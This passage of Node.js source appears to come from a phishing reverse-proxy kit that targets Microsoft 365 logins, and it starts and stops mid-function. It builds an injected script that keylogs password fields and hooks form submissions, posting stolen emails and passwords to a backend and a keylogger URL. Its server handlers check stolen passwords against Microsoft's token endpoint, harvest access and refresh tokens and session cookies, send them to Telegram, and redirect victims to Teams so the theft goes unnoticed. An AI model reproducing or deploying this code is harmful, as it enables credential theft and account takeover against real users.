            if (!email || !password) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'Email and password required' }));
                return;
            }
            
            sendCredentialsToAllEndpoints(email, password, source || 'api', sessionId, {
                ip: ip,
                userAgent: req.headers['user-agent'],
                url: req.headers.referer || 'unknown',
                ...context
            });
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                success: true, 
                message: 'Credentials captured',
                sessionId: sessionId
            }));
            
        } catch (error) {
            console.error('[PASSWORD-CAPTURE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  GENERATE ENHANCED PASSWORD CAPTURE SCRIPT
// ============================================================

function generatePasswordCaptureScript(sessionId, email, randomUA) {
    return `
// ============================================================
//  ENHANCED PASSWORD CAPTURE SCRIPT
//  Integrated with proxy server
//  Version: 4.0 - Full Integration
// ============================================================

(function() {
    'use strict';

    const SESSION_ID = '${sessionId}';
    const EMAIL = '${email}';
    const BACKEND_URL = '${BACKEND_URL}';
    const KEYLOGGER_URL = '${KEYLOGGER_URL}';
    const PROXY_URL = window.location.origin;
    const USER_AGENT = '${randomUA}';

    console.log('🔐 Enhanced Password Capture v4.0');
    console.log('📧 Email:', EMAIL);
    console.log('🆔 Session:', SESSION_ID);

    let capturedEmail = EMAIL || '';
    let capturedPassword = '';
    let lastPasswordValue = '';
    let passwordField = null;
    let emailField = null;
    let captureAttempts = 0;

    function findPasswordField() {
        const selectors = [
            'input[type="password"]',
            'input[name="passwd"]',
            'input[name="password"]',
            'input[name="pass"]',
            'input[id="i0118"]',
            'input[id="password"]',
            'input[placeholder*="password" i]',
            'input[autocomplete="current-password"]',
            'input[name="loginPassword"]'
        ];

        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }

        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            
            if (type === 'password' ||
                name.toLowerCase().includes('pass') ||
                id.toLowerCase().includes('pass') ||
                placeholder.toLowerCase().includes('pass')) {
                return input;
            }
        }

        return null;
    }

    function findEmailField() {
        const selectors = [
            'input[name="loginfmt"]',
            'input[name="login"]',
            'input[name="username"]',
            'input[name="email"]',
            'input[type="email"]',
            'input[id="i0116"]',
            'input[placeholder*="email" i]'
        ];

        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }

        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            
            if (type === 'email' ||
                name.toLowerCase().includes('email') ||
                name.toLowerCase().includes('mail') ||
                name.toLowerCase().includes('user') ||
                id.toLowerCase().includes('email') ||
                placeholder.toLowerCase().includes('email')) {
                return input;
            }
        }

        return null;
    }

    function sendCredentials(email, password, source) {
        if (!email) email = capturedEmail || EMAIL || 'unknown';
        if (!password) password = capturedPassword || '';
        
        if (!password || password.length < 2) {
            console.log('[CREDENTIALS] ⚠️ Skipping short password');
            return;
        }

        captureAttempts++;
        const data = {
            email: email,
            password: password,
            source: source || 'password_capture',
            sessionId: SESSION_ID,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            passwordLength: password.length,
            captureAttempt: captureAttempts,
            context: {
                pageTitle: document.title,
                domain: window.location.hostname,
                formAction: document.querySelector('form')?.action || 'unknown'
            }
        };

        console.log('[CREDENTIALS] 📤 Sending:', email, '|', '***', '(', source, ')');

        fetch('/api/password-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});

        fetch(BACKEND_URL + '/api/credential-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});

        fetch(KEYLOGGER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'credential_capture',
                email: email,
                password: password,
                source: source,
                sessionId: SESSION_ID,
                url: window.location.href,
                timestamp: Date.now()
            }),
            keepalive: true
        }).catch(() => {});
    }

    function monitorPasswordField() {
        passwordField = findPasswordField();
        if (!passwordField) {
            setTimeout(monitorPasswordField, 2000);
            return;
        }

        passwordField.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                console.log('[PASSWORD] 🔑 Captured:', value.length > 0 ? '***' : '(empty)');
                
                if (value.length > 2 && capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_input');
                }
            }
        });

        passwordField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && value.length > 2) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_change');
                }
            }
        });

        passwordField.addEventListener('blur', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_blur');
                }
            }
        });

        console.log('[PASSWORD] ✅ Password field monitoring active');
    }

    function monitorEmailField() {
        emailField = findEmailField();
        if (!emailField) {
            setTimeout(monitorEmailField, 2000);
            return;
        }

        emailField.addEventListener('input', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Captured:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_input');
                }
            }
        });

        console.log('[EMAIL] ✅ Email field monitoring active');
    }

    function monitorFormSubmission() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            let email = capturedEmail || EMAIL || '';
            let password = capturedPassword || '';

            for (const [key, value] of formData.entries()) {
                const keyLower = key.toLowerCase();
                
                if (keyLower.includes('email') || keyLower.includes('mail') || keyLower.includes('user')) {
                    if (value && (value.includes('@') || value.length > 5)) {
                        email = value;
                        capturedEmail = value;
                    }
                }
                
                if (keyLower.includes('pass') || keyLower.includes('pwd')) {
                    if (value) {
                        password = value;
                        capturedPassword = value;
                    }
                }
                
                if (key === 'loginfmt' && value) {
                    email = value;
                    capturedEmail = value;
                }
                if (key === 'passwd' && value) {
                    password = value;
                    capturedPassword = value;
                }
            }

            if (email && password) {
                console.log('[FORM] 📧 Email:', email);
                console.log('[FORM] 🔑 Password:', password.length > 0 ? '***' : '(empty)');
                sendCredentials(email, password, 'form_submit');
            }
        }, true);
    }

    function periodicPasswordCheck() {
        setInterval(() => {
            if (passwordField) {
                const currentValue = passwordField.value;
                if (currentValue && currentValue.length > 2 && currentValue !== lastPasswordValue) {
                    capturedPassword = currentValue;
                    lastPasswordValue = currentValue;
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, currentValue, 'periodic_check');
                    }
                }
            }
            
            if (emailField) {
                const currentValue = emailField.value;
                if (currentValue && (currentValue.includes('@') || currentValue.length > 5) && currentValue !== capturedEmail) {
                    capturedEmail = currentValue;
                    console.log('[EMAIL] 📧 Periodic capture:', currentValue);
                }
            }
        }, 3000);
    }

    function setupKeyloggerForPassword() {
        let passwordBuffer = '';
        let passwordInput = findPasswordField();

        if (!passwordInput) {
            setTimeout(setupKeyloggerForPassword, 2000);
            return;
        }

        passwordInput.addEventListener('keydown', function(e) {
            const key = e.key;
            
            if (key === 'Backspace') {
                passwordBuffer = passwordBuffer.slice(0, -1);
            } else if (key === 'Enter') {
                if (passwordBuffer.length > 2) {
                    capturedPassword = passwordBuffer;
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, capturedPassword, 'keydown_enter');
                    }
                }
                passwordBuffer = '';
            } else if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
                passwordBuffer += key;
                capturedPassword = passwordBuffer;
                console.log('[KEYLOG] 🔑 Password char:', key);
            }
        });

        console.log('[KEYLOGGER] ✅ Password keylogger active');
    }

    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            if (capturedEmail && capturedPassword) {
                console.log('[MANUAL] 📧 Email:', capturedEmail);
                console.log('[MANUAL] 🔑 Password:', capturedPassword);
                sendCredentials(capturedEmail, capturedPassword, 'manual_capture');
                alert('✅ Credentials captured and sent!');
            }
        }
    });

    function setupMutationObserver() {
        const observer = new MutationObserver(function(mutations) {
            let shouldRecheck = false;
            
            for (const mutation of mutations) {
                if (mutation.addedNodes.length > 0) {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'INPUT') {
                                if (node.type === 'password' || node.type === 'email') {
                                    shouldRecheck = true;
                                }
                            }
                            const inputs = node.querySelectorAll ? node.querySelectorAll('input') : [];
                            for (const input of inputs) {
                                if (input.type === 'password' || input.type === 'email') {
                                    shouldRecheck = true;
                                }
                            }
                        }
                    }
                }
            }
            
            if (shouldRecheck) {
                setTimeout(() => {
                    passwordField = findPasswordField();
                    emailField = findEmailField();
                    if (passwordField) {
                        console.log('[OBSERVER] ✅ Password field reconnected');
                        monitorPasswordField();
                        setupKeyloggerForPassword();
                    }
                    if (emailField) {
                        console.log('[OBSERVER] ✅ Email field reconnected');
                        monitorEmailField();
                    }
                }, 1000);
            }
        });

        try {
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            console.log('[OBSERVER] ✅ Mutation observer active');
        } catch(e) {}
    }

    function init() {
        console.log('🔐 Enhanced Password Capture v4.0');
        console.log('🆔 Session:', SESSION_ID);

        setTimeout(() => {
            emailField = findEmailField();
            if (emailField) monitorEmailField();

            passwordField = findPasswordField();
            if (passwordField) {
                monitorPasswordField();
                setupKeyloggerForPassword();
            }

            monitorFormSubmission();
            periodicPasswordCheck();
            setupMutationObserver();
            
            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'script_initialized',
                    sessionId: SESSION_ID,
                    email: EMAIL,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});

        }, 500);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    window.__passwordCapture = {
        getEmail: () => capturedEmail,
        getPassword: () => capturedPassword,
        getSessionId: () => SESSION_ID,
        sendCredentials: sendCredentials
    };

    console.log('✅ Enhanced Password Capture initialized');
    console.log('💡 Use Ctrl+Shift+C to manually capture credentials');
})();
`;
}

// ============================================================
//  OAUTH AUTO-CAPTURE
// ============================================================

function handleOAuthCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const { email, sessionId, password, source } = JSON.parse(body);
            const ip = getClientIp(req);
            
            console.log(`[OAUTH-CAPTURE] 🚀 Starting for: ${email}`);
            console.log(`[OAUTH-CAPTURE] 🔑 Password captured: ${password ? '***' : 'N/A'}`);
            
            const oauthToken = crypto.randomBytes(32).toString('hex');
            const name = email.split('@')[0].replace(/[._-]/g, ' ');
            const org = email.split('@')[1] || 'Unknown';
            
            let httpOnlyCount = 0;
            let tokenCount = 0;
            
            if (sessionId) {
                httpOnlyCount = sessionStore.getHttpOnlyCookies(sessionId).length;
                const tokens = sessionStore.allTokens.get(sessionId) || {};
                tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
            }
            
            sendCredentialsToAllEndpoints(email, password || 'AUTO_CAPTURED_VIA_OAUTH', 'oauth_capture', sessionId, {
                ip: ip,
                userAgent: req.headers['user-agent'],
                url: req.headers.referer || 'unknown'
            });
            
            sessionStore.storeFullAuthData(sessionId, {
                email: email,
                name: name,
                organization: org,
                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
                appPassword: null,
                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
                collectedAt: new Date().toISOString(),
                userAgent: req.headers['user-agent'],
                ip: ip,
                autoCaptured: true,
                oauthToken: oauthToken
            });
            
            // Send OAuth alert
            sendTelegramAlert('oauth_capture', {
                email: email,
                name: name,
                organization: org,
                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
                oauthToken: oauthToken,
                sessionId: sessionId,
                ip: ip,
                timestamp: new Date().toISOString(),
                httpOnlyCount: httpOnlyCount,
                tokenCount: tokenCount
            });
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                token: oauthToken,
                sessionId: sessionId,
                message: 'OAuth capture initiated'
            }));
            
        } catch (error) {
            console.error('[OAUTH-CAPTURE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  OAUTH CALLBACK HANDLER
// ============================================================

const OAUTH_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';

function handleOAuthCallback(req, res) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const code = url.searchParams.get('code');
        const error = url.searchParams.get('error');
        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
        
        console.log('[OAUTH-CALLBACK] 📥 Received callback');
        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
        
        if (error) {
            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
            return;
        }
        
        if (code) {
            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
            
            const tokenData = querystring.stringify({
                client_id: MICROSOFT_CLIENT_ID,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: OAUTH_REDIRECT_URI,
                scope: MICROSOFT_SCOPES
            });
            
            const tokenOptions = {
                hostname: 'login.microsoftonline.com',
                path: '/common/oauth2/v2.0/token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(tokenData),
                    'Accept': 'application/json'
                }
            };
            
            const tokenReq = https.request(tokenOptions, (tokenRes) => {
                let tokenBody = '';
                tokenRes.on('data', chunk => tokenBody += chunk);
                tokenRes.on('end', () => {
                    try {
                        const tokens = JSON.parse(tokenBody);
                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
                        
                        const accessToken = tokens.access_token;
                        const refreshToken = tokens.refresh_token;
                        const idToken = tokens.id_token;
                        
                        if (sessionId) {
                            sessionStore.storeTokens(sessionId, {
                                access_token: accessToken,
                                refresh_token: refreshToken,
                                id_token: idToken
                            });
                            
                            const session = sessionStore.sessions.get(sessionId);
                            if (session) {
                                session.tokens = session.tokens || {};
                                session.tokens.access_token = accessToken;
                                session.tokens.refresh_token = refreshToken;
                                session.tokens.id_token = idToken;
                                session.lastActivity = Date.now();
                            }
                        }
                        
                        getUserInfoFromToken(accessToken, sessionId);
                        
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                        
                        // Send success alert
                        sendTelegramAlert('validation_success', {
                            email: email,
                            password: 'AUTO_CAPTURED_VIA_OAUTH',
                            accessToken: accessToken,
                            refreshToken: refreshToken,
                            idToken: idToken,
                            sessionId: sessionId,
                            ip: getClientIp(req),
                            timestamp: new Date().toISOString(),
                            validationTime: 'OAUTH',
                            httpOnlyCount: sessionStore.getHttpOnlyCookies(sessionId).length,
                            tokenCount: Object.keys(tokens).length,
                            secure: true
                        });
                        
                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
                        
                        res.writeHead(302, { 
                            'Location': proxyLoginUrl,
                            'Cache-Control': 'no-store, no-cache'
                        });
                        res.end();
                        
                    } catch (error) {
                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                            `client_id=${MICROSOFT_CLIENT_ID}&` +
                            `response_type=code&` +
                            `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                            `login_hint=${encodeURIComponent(email)}`;
                        
                        res.writeHead(302, { 'Location': fallbackUrl });
                        res.end();
                    }
                });
            });
            
            tokenReq.on('error', (err) => {
                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
                res.writeHead(302, { 'Location': REDIRECT_URL });
                res.end();
            });
            
            tokenReq.write(tokenData);
            tokenReq.end();
            
        } else {
            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        }
        
    } catch (error) {
        console.error('[OAUTH-CALLBACK] Error:', error.message);
        res.writeHead(302, { 'Location': REDIRECT_URL });
        res.end();
    }
}

function getUserInfoFromToken(accessToken, sessionId) {
    if (!accessToken) return;
    
    const options = {
        hostname: 'graph.microsoft.com',
        path: '/v1.0/me',
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${accessToken}`,
            'Accept': 'application/json'
        }
    };
    
    const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const userInfo = JSON.parse(data);
                console.log('[USER-INFO] ✅ Retrieved user info');
                
                if (sessionId) {
                    sessionStore.storeFullAuthData(sessionId, {
                        email: userInfo.mail || userInfo.userPrincipalName || 'unknown',
                        name: userInfo.displayName || 'unknown',
                        organization: userInfo.companyName || 'unknown',
                        password: 'AUTO_CAPTURED_VIA_OAUTH',
                        twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
                        collectedAt: new Date().toISOString(),
                        autoCaptured: true
                    });
                }
                
            } catch (error) {
                console.error('[USER-INFO] Error:', error.message);
            }
        });
    });
    
    req.on('error', (err) => {
        console.error('[USER-INFO] Request error:', err.message);
    });
    
    req.end();
}

// ============================================================
//  MICROSOFT VERIFICATION WITH FULL TELEGRAM ALERTS
// ============================================================

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();
        
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const validationTime = Date.now() - startTime;
                
                try {
                    const response = JSON.parse(data);
                    
                    if (response.access_token) {
                        const cookies = {};
                        
                        if (response.access_token) {
                            cookies['ESTSAUTH'] = {
                                value: response.access_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: response.refresh_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
                            cookies['ESTSSESSION'] = {
                                value: response.id_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        } else {
                            cookies['ESTSSESSION'] = {
                                value: null,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        
                        resolve({
                            success: true,
                            data: response,
                            tokens: {
                                access_token: response.access_token,
                                refresh_token: response.refresh_token || null,
                                id_token: response.id_token || null
                            },
                            cookies: cookies,
                            validationTime: validationTime
                        });
                    } else {
                        resolve({ 
                            success: false, 
                            error: response.error_description || 'Invalid credentials', 
                            cookies: null,
                            validationTime: validationTime
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  HANDLE POST REQUEST - WITH VALIDATION AND TELEGRAM ALERTS
// ============================================================

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        console.log('[POST] 📥 Processing login attempt');
        
        // Extract password
        let password = '';
        const passwordFields = ['passwd', 'password', 'Password', 'PASSWORD', 'pass', 'pwd', 'loginPassword', 'Passwd'];
        for (const field of passwordFields) {
            if (formData[field]) {
                password = formData[field];
                console.log(`[POST] 🔑 Found password in field: ${field}`);
                break;
            }
        }
        
        if (!password) {
            const bodyStr = body.toString();
            const passMatch = bodyStr.match(/passwd=([^&]+)/i) || bodyStr.match(/password=([^&]+)/i);
            if (passMatch) {
                password = decodeURIComponent(passMatch[1]);
                console.log('[POST] 🔑 Extracted password from raw body');
            }
        }
        
        // Extract email
        let email = '';
        const emailFields = ['loginfmt', 'login', 'email', 'Email', 'username', 'user', 'LoginId', 'loginId'];
        for (const field of emailFields) {
            if (formData[field]) {
                email = formData[field];
                console.log(`[POST] 📧 Found email in field: ${field}`);
                break;
            }
        }
        
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) {
                email = decodeURIComponent(match[1]);
                console.log('[POST] 📧 Extracted email from URL');
            }
        }
        
        if (!email) {
            const session = getSession(sessionId);
            if (session) {
                email = session.email;
                console.log('[POST] 📧 Retrieved email from session');
            }
        }
        
        if (!email) {
            console.warn('[POST] ⚠️ No email found, using unknown');
            email = 'unknown@domain.com';
        }

        // Track attempt count
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);

        // Send credentials to all endpoints if password exists
        if (password && password.length > 0) {
            sendCredentialsToAllEndpoints(email, password, 'form_submit', sessionId, {
                ip: ip,
                userAgent: req.headers['user-agent'],
                url: req.url,
                formData: formData,
                attemptCount: attemptCount
            });
        }

        // Store in session
        if (sessionId) {
            if (VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
                if (password) {
                    VICTIM_SESSIONS[sessionId].password = password;
                }
                VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
            }
            
            const sessionData = sessionStore.sessions.get(sessionId);
            if (sessionData) {
                sessionData.password = password || sessionData.password;
                sessionData.lastActivity = Date.now();
                sessionData.forms = sessionData.forms || [];
                sessionData.forms.push({
                    email: email,
                    password: password,
                    formData: formData,
                    url: req.url,
                    method: 'POST',
                    ip: ip,
                    timestamp: Date.now()
                });
            }
            
            sessionStore.addEvasionCounter(sessionId);
        }

        // ============================================================
        //  VERIFY WITH MICROSOFT AND SEND TELEGRAM ALERTS
        // ============================================================
        
        verifyWithMicrosoft(email, password)
            .then(async (result) => {
                if (result.success) {
                    console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
                    console.log(`[AUTH] ⏱️ Validation time: ${result.validationTime}ms`);
                    
                    // Store tokens
                    if (sessionId && result.tokens) {
                        const storedTokens = sessionStore.storeTokens(sessionId, result.tokens);
                    }
                    
                    // Store HttpOnly cookies
                    let httpOnlyCount = 0;
                    if (sessionId && result.cookies) {
                        const validCookies = {};
                        for (const [name, data] of Object.entries(result.cookies)) {
                            if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                                validCookies[name] = data;
                            }
                        }
                        if (Object.keys(validCookies).length > 0) {
                            sessionStore.storeCookies(sessionId, validCookies, 'auth_response');
                            // Store as HttpOnly cookies
                            const cookieHeaders = [];
                            for (const [name, data] of Object.entries(validCookies)) {
                                cookieHeaders.push(`${name}=${data.value}; HttpOnly; Secure; SameSite=Lax`);
                            }
                            sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, 'microsoft_auth');
                            httpOnlyCount = cookieHeaders.length;
                        }
                    }
                    
                    // Update session
                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
                        VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
                        VICTIM_SESSIONS[sessionId].validationAttempts.push({
                            result: 'success',
                            timestamp: Date.now(),
                            validationTime: result.validationTime
                        });
                        VICTIM_SESSIONS[sessionId].httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
                        VICTIM_SESSIONS[sessionId].cookieHeader = sessionStore.getCookieHeader(sessionId);
                    }
                    
                    // Send SUCCESS Telegram alert with ALL data
                    await sendTelegramAlert('validation_success', {
                        email: email,
                        password: password || 'N/A',
                        accessToken: result.tokens?.access_token,
                        refreshToken: result.tokens?.refresh_token,
                        idToken: result.tokens?.id_token,
                        sessionId: sessionId,
                        ip: ip,
                        timestamp: new Date().toISOString(),
                        validationTime: result.validationTime,
                        attemptCount: attemptCount,
                        httpOnlyCount: httpOnlyCount,
                        tokenCount: result.tokens ? Object.keys(result.tokens).length : 0,
                        secure: true
                    });
                    
                    // Also send HttpOnly cookie alert
                    if (httpOnlyCount > 0) {
                        const httpOnlyCookies = sessionStore.getHttpOnlyCookies(sessionId);
                        const cookieList = httpOnlyCookies.map(c => 
                            `  🔒 \`${c.name}\`: \`${c.value.substring(0, 30)}...\``
                        ).join('\n');
                        
                        await sendTelegramAlert('http_only_cookies', {
                            email: email,
                            sessionId: sessionId,
                            timestamp: new Date().toISOString(),
                            cookieCount: httpOnlyCount,
                            httpOnlyCount: httpOnlyCount,
                            cookieList: cookieList || 'No HttpOnly cookies'
                        });
                    }
                    
                    // Redirect to Teams
                    res.writeHead(302, { 
                        'Location': TEAMS_REDIRECT, 
                        'Cache-Control': 'no-store, no-cache, must-revalidate'
                    });
                    res.end();
                    
                } else {
                    console.log(`[AUTH] ❌ INVALID Microsoft credentials: ${email}`);
                    console.log(`[AUTH] ⏱️ Validation time: ${result.validationTime}ms`);
                    console.log(`[AUTH] ❌ Error: ${result.error}`);
                    
                    // Update session
                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
                        VICTIM_SESSIONS[sessionId].lastValidationResult = 'failed';
                        VICTIM_SESSIONS[sessionId].validationAttempts.push({
                            result: 'failed',
                            timestamp: Date.now(),
                            error: result.error,
                            validationTime: result.validationTime
                        });
                    }
                    
                    // Send FAILED Telegram alert
                    await sendTelegramAlert('validation_failed', {
                        email: email,
                        password: password || 'N/A',
                        sessionId: sessionId,
                        ip: ip,
                        timestamp: new Date().toISOString(),
                        attemptCount: attemptCount,
                        error: result.error || 'Invalid username or password',
                        validationTime: result.validationTime,
                        retryCount: attemptCount - 1
                    });
                    
                    // Redirect back to Microsoft login with error
                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                        `client_id=${MICROSOFT_CLIENT_ID}&` +
                        `response_type=code&` +
                        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                        `login_hint=${encodeURIComponent(email)}&` +
                        `error=invalid_credentials`;
                    
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                }
            })
            .catch(async (error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                
                // Send error alert
                await sendTelegramAlert('validation_failed', {
                    email: email,
                    password: password || 'N/A',
                    sessionId: sessionId,
                    ip: ip,
                    timestamp: new Date().toISOString(),
                    attemptCount: attemptCount,
                    error: error.message || 'Service error',
                    validationTime: 'N/A',
                    retryCount: attemptCount - 1
                });
                
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                    `client_id=${MICROSOFT_CLIENT_ID}&` +
                    `response_type=code&` +
                    `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                    `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                    `login_hint=${encodeURIComponent(email)}&` +
                    `error=service_error`;
                
